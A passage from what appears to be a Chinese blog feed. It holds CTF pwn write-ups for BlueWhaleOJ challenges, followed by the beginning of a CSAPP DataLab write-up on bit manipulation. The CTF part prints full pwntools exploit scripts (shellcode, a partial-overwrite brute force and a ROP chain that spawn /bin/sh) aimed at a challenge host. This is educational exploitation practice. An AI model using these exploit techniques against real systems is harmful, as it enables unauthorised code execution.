ELF(&#x27;./libc6_2.27-3ubuntu1.2_amd64.so&#x27;)</span></span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&quot;./pwn1&quot;</span>)</span><br><span class="line">pg = cyclic_gen()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(argv) &gt; <span class="number">1</span>:</span><br><span class="line">    conn = remote(HOST, PORT)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    env = &#123;</span><br><span class="line">        <span class="string">&#x27;LD_PRELOAD&#x27;</span>: libc.path <span class="keyword">if</span> libc <span class="keyword">else</span> <span class="string">&#x27;&#x27;</span></span><br><span class="line">    &#125;</span><br><span class="line">    conn = process(elf.path, env=env)</span><br><span class="line">    <span class="comment">#  b2 cc </span></span><br><span class="line"><span class="comment"># 5 4 9 8</span></span><br><span class="line">shellcode = asm(</span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">syscall</span></span><br><span class="line"><span class="string">nop</span></span><br><span class="line"><span class="string">nop</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line">) + <span class="string">&#x27;\xb2&#x27;</span> + asm(<span class="string">&#x27;mov rsi, rcx&#x27;</span>) + <span class="string">&#x27;\xb2&#x27;</span> + asm(</span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">sub rsi, 0x32</span></span><br><span class="line"><span class="string">mov dl, 0x20</span></span><br><span class="line"><span class="string">syscall</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line">) + <span class="string">&#x27;\xb2&#x27;</span> + asm(<span class="string">&#x27;jmp rsi&#x27;</span>)</span><br><span class="line"></span><br><span class="line">shellcode = shellcode.ljust(<span class="number">26</span>, <span class="string">&#x27;\x90&#x27;</span>)</span><br><span class="line"></span><br><span class="line">log.info(<span class="string">&#x27;Shellcode: &#x27;</span> + shellcode.encode(<span class="string">&#x27;hex&#x27;</span>))</span><br><span class="line"><span class="keyword">assert</span> <span class="built_in">len</span>(shellcode) == <span class="number">26</span></span><br><span class="line"></span><br><span class="line">conn.sendafter(<span class="string">&#x27;Send me your ride\n&#x27;</span>, shellcode)</span><br><span class="line">conn.send(asm(</span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">mov al, 0x3b</span></span><br><span class="line"><span class="string">mov rdi, rsi</span></span><br><span class="line"><span class="string">add rdi, 0x11</span></span><br><span class="line"><span class="string">xor rsi, rsi</span></span><br><span class="line"><span class="string">xor rdx, rdx</span></span><br><span class="line"><span class="string">syscall</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line">) + <span class="string">&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line">conn.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="pwneta-200"><a href="#pwneta-200" class="headerlink" title="pwneta(200)"></a>pwneta(200)</h1><p>使用 checksec 检查一下，发现开启了 PIE，所以此题的主要目的就是绕过 PIE 进行 ROP。主要的溢出点为</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">ssize_t</span> <span class="title function_">sub_868</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> v1[<span class="number">6</span>]; <span class="comment">// [rsp+8h] [rbp-408h]</span></span><br><span class="line">  <span class="type">char</span> buf[<span class="number">1026</span>]; <span class="comment">// [rsp+Eh] [rbp-402h]</span></span><br><span class="line"></span><br><span class="line">  read(<span class="number">0</span>, &amp;buf[<span class="number">2</span>], <span class="number">1024uLL</span>);</span><br><span class="line">  <span class="keyword">while</span> (<span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Changes you&#x27;d like to make (y/n)?&quot;</span>);</span><br><span class="line">    read(<span class="number">0</span>, &amp;buf[<span class="number">1</span>], <span class="number">1uLL</span>);</span><br><span class="line">    <span class="keyword">if</span> (buf[<span class="number">1</span>] == <span class="string">&#x27;n&#x27;</span> )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    *v1 = <span class="number">0</span>;</span><br><span class="line">    read(<span class="number">0</span>, v1, <span class="number">1uLL</span>);</span><br><span class="line">    read(<span class="number">0</span>, &amp;v1[<span class="number">1</span>], <span class="number">1uLL</span>);</span><br><span class="line">    read(<span class="number">0</span>, buf, <span class="number">1uLL</span>);</span><br><span class="line">    buf[*v1 + <span class="number">2</span>] = buf[<span class="number">0</span>];</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> write(<span class="number">1</span>, <span class="string">&quot;So cool.\n&quot;</span>, <span class="number">9uLL</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>buf 的长度为 1026，其功能为首先读入 1024 个字节到 buf 的后 1024 位中，前两位空出来，之后循环，首先读取一个字节到 buf[1]中，非 n 的话就读取 2 个字节到 v1 中，再读取 1 个字节到 buf[0]中，读取到 v1 中的字节的值将作为偏移，将读取到的 buf[0]的值写入 buf 中，控制了 v1 以后我们就可以在很大的范围内任意写入内存。</p><p>由于每次 v1 最多读两个字节，所以偏移的最大值为 0xffff。写入的起始位置在 buf[2]，也就是 <code>rbp-0x402+2 = rbp-0x400</code> 处，为了可以写到 rbp，所以我们每次发送的偏移必须加上 0x400。</p><p>由于题目中并没有任何 puts 或 pringtf 的参数可控（无法控制 rdi），所以无法泄漏任何地址，因此为了绕过 PIE，只能用 Partial Write 去改写某个内存中地址的后几个字节。我们所输入的 payload 在最后 sub_868 函数执行结束后才会触发，所以我们只能在该函数栈帧后面寻找，并且为了实现 one gadget，我们要寻找并且修改的的需要是 libc 中的地址而不是程序地址，可以看到在 rbp+0x238 的地方有一个 libc main 的地址。</p><p><img src="/2020/10/16/BlueWhaleOJ-Pwn-WriteUp-Part1/7.png"></p><p><img src="/2020/10/16/BlueWhaleOJ-Pwn-WriteUp-Part1/8.png"></p><p>该地址将会在函数执行结束后跳转，所以我们要修改的就是这个地址。题目使用的 libc 位 2.27-ubuntu1.2 的版本，拿到这个版本的 one gadget 后在本地加载一个该 libc 的基址，然后再加上 one gadget 的偏移，就得到了一个 libc 的地址，取最后三个字节最为 Partial Write 的目标。由于每次程序加载的 libc 基址都会变，但是 libc 基址的后 1.5 个字节（也就是 3 个十六进制数）都是 0，所以刚才计算出的那个地址最后 1.5 个字节肯定是对的，而我们只修改了 libc main 地址的最后 3 个字节，所以只剩下 1.5 个字节是需要靠运气的，其枚举空间为 16 的 3 次方也就是 4096，脚本一直循环，看运气总有一次可以命中那 1.5 个字节，脸好的几百次可能就命中，脸黑的可能就得几千次。最终的 exp 如下，拿到 flag<code>ctf&#123;p4rtia!_overwrl73_IS_gre4T&#125;</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> sys <span class="keyword">import</span> argv</span><br><span class="line">    HOST = <span class="string">&#x27;campus1.blue-whale.me&#x27;</span></span><br><span class="line">PORT = <span class="number">19906</span></span><br><span class="line"></span><br><span class="line">context.clear(arch=<span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line">context.update(terminal=[<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;splitw&#x27;</span>, <span class="string">&#x27;-h&#x27;</span>])</span><br><span class="line"><span class="comment"># context.update(log_level=&#x27;debug&#x27;) </span></span><br><span class="line"></span><br><span class="line">libc = <span class="literal">None</span></span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>)</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line">pg = cyclic_gen()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(argv) &gt; <span class="number">1</span>:</span><br><span class="line">    conn = remote(HOST, PORT)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    env = &#123;</span><br><span class="line">        <span class="string">&#x27;LD_PRELOAD&#x27;</span>: libc.path <span class="keyword">if</span> libc <span class="keyword">else</span> <span class="string">&#x27;&#x27;</span></span><br><span class="line">    &#125;</span><br><span class="line">    conn = process(elf.path, env=env)</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">pwn</span>(<span class="params">start, value</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;Wite value to rbp+start.&quot;&quot;&quot;</span></span><br><span class="line">    cur = start</span><br><span class="line">    log.info(<span class="string">&#x27;Sending: &#x27;</span> + value.encode(<span class="string">&#x27;hex&#x27;</span>))</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> value:</span><br><span class="line">        conn.sendafter(<span class="string">&quot;Changes you&#x27;d like to make (y/n)?\n&quot;</span>, <span class="string">&#x27;y&#x27;</span>)</span><br><span class="line">        offset = cur + <span class="number">0x400</span></span><br><span class="line">        <span class="keyword">assert</span> offset &lt;= <span class="number">0xffff</span></span><br><span class="line">        conn.send(p16(offset))</span><br><span class="line">        conn.send(i)</span><br><span class="line">        cur += <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">One gadget:</span></span><br><span class="line"><span class="string">    0x4f3c2 execve(&quot;/bin/sh&quot;, rsp+0x40, environ)</span></span><br><span class="line"><span class="string">    constraints:</span></span><br><span class="line"><span class="string">    [rsp+0x40] == NULL</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">i = <span class="number">0</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    i += <span class="number">1</span></span><br><span class="line">    <span class="built_in">print</span> i,</span><br><span class="line">    conn.sendafter(<span class="string">&#x27;What do you have this time\n&#x27;</span>, <span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">    pwn(<span class="number">0x238</span>, <span class="string">&#x27;\xf1\x83\xc2&#x27;</span>[::-<span class="number">1</span>])</span><br><span class="line">    <span class="comment"># pause()</span></span><br><span class="line">    <span class="comment"># gdb.attach(conn)</span></span><br><span class="line">    conn.sendafter(<span class="string">&quot;Changes you&#x27;d like to make (y/n)?\n&quot;</span>, <span class="string">&#x27;n&#x27;</span>)</span><br><span class="line">    conn.sendlineafter(<span class="string">&#x27;L8R.\n&#x27;</span>, <span class="string">&#x27;cat flag&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        ret = conn.recv()</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;&#123;&#x27;</span> <span class="keyword">in</span> ret:</span><br><span class="line">            <span class="built_in">print</span> ret</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">except</span> EOFError:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line">    conn.close()</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(argv) &gt; <span class="number">1</span>:</span><br><span class="line">        conn = remote(HOST, PORT)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        env = &#123;</span><br><span class="line">            <span class="string">&#x27;LD_PRELOAD&#x27;</span>: libc.path <span class="keyword">if</span> libc <span class="keyword">else</span> <span class="string">&#x27;&#x27;</span></span><br><span class="line">        &#125;</span><br><span class="line">        conn = process(elf.path, env=env)</span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="pwntheta-200"><a href="#pwntheta-200" class="headerlink" title="pwntheta(200)"></a>pwntheta(200)</h1><p>此题意义不明，溢出点位于 sub_400C58，buf 的大小为 1032 字节，但是会读入 2015 字节，所以可以造成栈溢出，虽然开启了 NX，但是程序是静态编译的，所以有大量的 Gadgets 可以用。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int64 <span class="title function_">sub_400C58</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> buf; <span class="comment">// [rsp+0h] [rbp-410h]</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v2; <span class="comment">// [rsp+408h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v2 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Yes?&quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, &amp;buf, <span class="number">2015uLL</span>);</span><br><span class="line">  write(<span class="number">1u</span>, <span class="string">&quot;Whatever\n&quot;</span>, <span class="number">9uLL</span>);</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>题目中有一个很奇怪的地方，通过 checksec 可以看到题目并没有开启 canary，但是汇编中却有与 canary 相关的指令，可以看到函数 sub_400B4D 中主要是与函数调用的初始化函数相关。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">init</span><span class="params">(__int64 a1, __int64 a2, __int64 a3)</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 result; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v4; <span class="comment">// rt1</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> fd; <span class="comment">// [rsp+4h] [rbp-2Ch]</span></span><br><span class="line">  <span class="type">char</span> v6[<span class="number">8</span>]; <span class="comment">// [rsp+8h] [rbp-28h]</span></span><br><span class="line">  <span class="type">char</span> buf[<span class="number">8</span>]; <span class="comment">// [rsp+10h] [rbp-20h]</span></span><br><span class="line">  <span class="type">char</span> *v8; <span class="comment">// [rsp+18h] [rbp-18h]</span></span><br><span class="line">  __int64 v9; <span class="comment">// [rsp+20h] [rbp-10h]</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v10; <span class="comment">// [rsp+28h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v10 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  fd = open(<span class="string">&quot;/flag&quot;</span>, <span class="number">0</span>, a3);</span><br><span class="line">  <span class="keyword">while</span> (<span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v9 = read(fd, buf, <span class="number">1uLL</span>);</span><br><span class="line">    <span class="keyword">if</span> (!v9)</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    *v6 = (v6[<span class="number">7</span>] ^ buf[<span class="number">0</span>]) ^ (*v6 &lt;&lt; <span class="number">8</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  close(fd);</span><br><span class="line">  v6[<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line">  *buf = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  v8 = buf;</span><br><span class="line">  <span class="keyword">do</span></span><br><span class="line">    v8 += <span class="number">8</span>;</span><br><span class="line">  <span class="keyword">while</span> (*v8 != *buf);</span><br><span class="line">  *v8 = *v6;</span><br><span class="line">  __writefsqword(<span class="number">0x28</span>u, *v6);</span><br><span class="line">  v4 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  result = v4 ^ v10;</span><br><span class="line">  <span class="keyword">if</span> (v4 != v10)</span><br><span class="line">    _check_stack_fail();</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>该函数内部首先会打开 flag 文件，所以本地调试该程序的时候需要在根目录下创建一个空的 flag 文件。看源码逻辑应该是自己实现了一个 canary，这个 canary 就是加密后的 flag 前 8 位，只要 flag 不变，canary 也是一直不变的。但是再看漏洞函数的最后验证 canary 的时候，不管验证是否通过，都直接 jmp，所以不会调用之后的 check_stack_fail 函数，所以这个程序可能被人 patch 过忘记改回来了，就直接发布到题目中，导致这道题的 canary 失效。</p><p><img src="/2020/10/16/BlueWhaleOJ-Pwn-WriteUp-Part1/10.png"></p><p>最后的 exp 如下，由于 canary 失效，所以主要原理就是 ROP，先调用 read 的系统调用把 <code>/bin/sh</code> 写入一个全局变量数组中，之后再调用 execve 即可，拿到 flag 为<code>ctf&#123;customiz3d_canary_SHould_b3_proved&#125;</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> sys <span class="keyword">import</span> argv</span><br><span class="line">    HOST = <span class="string">&#x27;campus1.blue-whale.me&#x27;</span></span><br><span class="line">PORT = <span class="number">19907</span></span><br><span class="line"></span><br><span class="line">context.clear(arch=<span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line">context.update(terminal=[<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;splitw&#x27;</span>, <span class="string">&#x27;-h&#x27;</span>])</span><br><span class="line">context.update(log_level=<span class="string">&#x27;debug&#x27;</span>) </span><br><span class="line"></span><br><span class="line">libc = <span class="literal">None</span></span><br><span class="line"><span class="comment"># libc = ELF(&#x27;./libc.so.6&#x27;)</span></span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line">pg = cyclic_gen()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(argv) &gt; <span class="number">1</span>:</span><br><span class="line">    conn = remote(HOST, PORT)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    env = &#123;</span><br><span class="line">        <span class="string">&#x27;LD_PRELOAD&#x27;</span>: libc.path <span class="keyword">if</span> libc <span class="keyword">else</span> <span class="string">&#x27;&#x27;</span></span><br><span class="line">    &#125;</span><br><span class="line">    conn = process(elf.path, env=env)</span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">ROP Gadgets:</span></span><br><span class="line"><span class="string">    0x000000000040ed4d : xor eax, eax ; ret</span></span><br><span class="line"><span class="string">    0x0000000000400686 : pop rdi ; ret</span></span><br><span class="line"><span class="string">    0x0000000000410253 : pop rsi ; ret</span></span><br><span class="line"><span class="string">    0x0000000000449915 : pop rdx ; ret</span></span><br><span class="line"><span class="string">    0x00000000004499DF : syscall</span></span><br><span class="line"><span class="string">    0x00000000004156c4 : pop rax ; ret</span></span><br><span class="line"><span class="string">    .bss:00000000006BB300 unk_6BB300</span></span><br><span class="line"><span class="string">.bss:00000000006BB33F                 db    ? ;</span></span><br><span class="line"><span class="string">0x3f</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">read 0x0 fd buf count</span></span><br><span class="line"><span class="string">execve 0x3b filename 0 0</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">buf = <span class="number">0x00000000006BB300</span></span><br><span class="line">xor_eax = <span class="number">0x000000000040ed4d</span></span><br><span class="line">pop_rdi = <span class="number">0x0000000000400686</span></span><br><span class="line">pop_rsi = <span class="number">0x0000000000410253</span></span><br><span class="line">pop_rdx = <span class="number">0x0000000000449915</span></span><br><span class="line">syscall = <span class="number">0x00000000004499DF</span></span><br><span class="line">bin_sh = <span class="string">&#x27;/bin/sh\x00&#x27;</span></span><br><span class="line">pop_rax = <span class="number">0x00000000004156c4</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line">conn.sendafter(</span><br><span class="line">    <span class="string">&#x27;Yes?\n&#x27;</span>, pg.get(<span class="number">0x410</span>+<span class="number">8</span>) + p64(xor_eax) + p64(pop_rdi) + p64(<span class="number">0</span>) +</span><br><span class="line">    p64(pop_rsi) + p64(buf) + p64(pop_rdx) + p64(<span class="number">8</span>) + p64(syscall) +</span><br><span class="line">    p64(pop_rax) + p64(<span class="number">0x3b</span>) + p64(pop_rdi) + p64(buf) + </span><br><span class="line">    p64(pop_rsi) + p64(<span class="number">0</span>) + p64(pop_rdx) + p64(<span class="number">0</span>) + p64(syscall)</span><br><span class="line">)</span><br><span class="line">conn.send(bin_sh)</span><br><span class="line"></span><br><span class="line">conn.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> BlueWhale </tag>
            
            <tag> WriteUp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CSAPP-DataLab WriteUp</title>
      <link href="/2020/08/14/CSAPP-DataLab%20WriteUp/"/>
      <url>/2020/08/14/CSAPP-DataLab%20WriteUp/</url>
      
        <content type="html"><![CDATA[<p>在这个 Lab 中主要需要完成 bits.c 文件中的部分函数以实现函数功能，代码必须顺序执行，即不能使用 if 条件分支或者 While 循环这一类，此外对于函数的实现必须使用指定的位操作符，例如与或非 (&amp;,|,) 等，具体每个函数的限制也不一样。</p><p>在完成 bits.c 后使用 dlc 进行检查，例如<code>./dlc bits.c</code>，检查函数的实现是否遵循指定的规则，检查通过后使用 btest 开始测试函数的输入与输出，btest 需要先编译再运行，例如<code>make clean &amp;&amp; make btest &amp;&amp; ./btest</code>。btest 将会对每一个函数给定指定的输入，检查输出是否正确，每一个函数都有一个等级与分值，等级越高难度和分数也越高。</p><p>具体规则如下：</p><ul><li>函数中禁止使用 if, do, while, for, switch 之类的控制语句。</li><li>文件中禁止定义任何宏，禁止定义任何额外的函数。</li><li>禁止调用函数。</li><li>在 int 类型的题目中禁止定义除 int 类型以外的变量。在 float 类型的题目中禁止定义除 int 和 unsigned 类型以外的变量，也禁止使用 flaot 类型与浮点数操作符。</li><li>函数中定义 int 类型的常量范围在<code>0x00 &lt;= int &lt;= 0xff</code>，不能大于 0xff。</li><li>不能使用全局变量，只能使用函数参数与局部变量。</li><li>操作符限制为一元操作符 <code>! ~</code> 和位操作符<code>&amp; ^ | + &lt;&lt; &gt;&gt;</code>，部分函数中可能仅允许使用一部分操作符。禁止使用二元与三元操作符，例如<code>|| &amp;&amp; ? -</code></li><li>在每个函数中会限制出现的操作符的数量，一条语句可以使用多个数量限制内的操作符。</li></ul><h1 id="背景知识"><a href="# 背景知识" class="headerlink" title="背景知识"></a>背景知识 </h1><p> 在 C 语言中，32 位的操作系统上一个 int 类型的变量占 32 个比特位，即 4 个字节。从右向左，代表从低位到高位，其中最高位 (最左边) 的比特位表示该数字的符号，1 表示该数字为负数，0 表示该数字为正数，后续的 31 个比特位中存放才是该数字的二进制数据，能存储的数字范围为 $-2^31&lt;=int&lt;=2^31$，即 $-2147483648&lt;=int&lt;=2147483648$。与 int 相比，无符号数 unsigned int 不需要符号位，所以可以多存储一位数据，其范围为 $-4294967296&lt;=unsigned&lt;=4294967296$。</p><p>上述的数值二进制表示方法称为原码，除了原码，计算机中还有反码与补码两种表示方法。正数的反码与补码和原码相同，而负数的反码为：符号位不变，其余位取反，负数的补码为：负数的反码加 1。反码的意义在于进行减法的时候计算机计算比较方便，而补码的意义在于解决 +0 与 -0 的问题：由于 int 的最高位是符号位，当数据位都为 0 时，数字 0 就有了两种表示方法，符号位是 0(即 0x0)代表 +0 和符号位是 1(即 0x80000000)代表 -0。此外补码还可以得到该数的相反数。</p><p>位操作符是 C 语言中最基本的操作符，将两个数字按比特位进行操作，使用位操作符的计算速度是最快的。C 语言中主要有以下位操作符，其中移位运算符的优先级比算术运算符的优先级更低。</p><table><thead><tr><th>符号</th><th>名称</th><th>说明</th></tr></thead><tbody><tr><td>&amp;</td><td>位且</td><td>两个数按位进行且运算，两个相比较的比特位中只要有一个 0，那么该位的结果就是 0</td></tr><tr><td>| 位或</td><td>两个数按位进行或运算，两个相比较的比特位中只要有一个 1，那么该位的结果就是 1</td><td></td></tr><tr><td>^</td><td>异或</td><td>两个数按位进行异或运算，两个相比较的比特位如果不一样那么该位的结果为 1，否则为 0</td></tr><tr><td>~</td><td>取反</td><td>将该数按位进行取反，0 变成 1，1 变成 0</td></tr><tr><td>&lt;&lt;</td><td>算术左移</td><td>将该数每一位左移指定位数，右边补 0，左移几位就是将原数乘以 2 的几次方</td></tr><tr><td>&gt;&gt;</td><td>算术右移</td><td>将该数每一位右移指定位数，左边补符号位，若符号位是 1 则补 1，负责补 0，仅针对正数而言右移几位就是将原数除以 2 的几次方</td></tr></tbody></table><p>浮点数的表示方法与整数完全不同。IEEE 规定单精度浮点数 float 用 1 位表示符号，8 位表示指数，剩下的 23 位表示尾数，双精度浮点数用 1 位表示符号，11 位表示指数，剩下的 52 位表示尾数。在计算机中任何浮点数都可以表示为<br>$$(-1)^s*(1.m)^*2^(E-127)$$</p><p>其中 s 代表符号位，m 代表尾数，E 代表阶码。</p><ul><li>如果阶码 E=255 并且 m 非零，则该数不是一个属，代表 NaN(Not a number)。</li><li>如果阶码 E=255 并且 m 为 0，那么该数根据符号位代表正负无穷。</li><li>如果阶码 E=0 并且 m 为 0，那么该数根据符号位代表正负零。</li></ul><h1 id="Bit-Manipulations"><a href="#Bit-Manipulations" class="headerlink" title="Bit Manipulations"></a>Bit Manipulations</h1><h2 id="bitAnd"><a href="#bitAnd" class="headerlink" title="bitAnd"></a>bitAnd</h2><p>使用 <code>~</code> 与<code>|</code>实现位与运算符，例如<code>bitAnd(6, 5) = 6 